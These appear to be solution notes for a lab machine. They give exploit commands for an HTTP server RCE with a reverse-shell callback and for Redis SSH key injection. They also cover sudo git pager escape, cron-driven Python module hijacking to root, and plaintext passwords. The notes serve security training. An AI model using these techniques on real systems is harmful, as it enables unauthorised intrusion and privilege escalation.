# User

## Port 8080
Custom HTTP server
Source code is "leaked" with a comment on /index.html
Vulnerable to RCE using webserver_python_RCE.sh

Gets access to michiko-arasaka user

    ./webserver_python_RCE.sh http://10.10.69.13:8080/ 10.10.69.42 3000

## Port 6379
Misconfigured Redis server
Vulnerable to sshkey authorized_keys injection using redis_sshkey_dropper.sh

Gets access to the server as redis user

    ./redis_sshkey_dropper.sh 10.10.69.13 6379 redis /var/lib/redis/.ssh

## redis sudo -l

can gain access to michiko-arasaka user with:

    sudo -u michiko-arasaka /usr/bin/git -p help

# Root

## /lib/python2.7/os.py
A crontab running as root runs every minute that executes /opt/BackupRedis/backup.py and import os.py
os.py is writable by michiko-arasaka

You can root the box from michiko-arasaka user by putting a shell at the bottom of
/lib/python2.7/os.py and waiting for the cron job to execute.

# Creds
root:UnguessableP@ssw0rd

michiko-arasaka:4d4m5M@SH3R

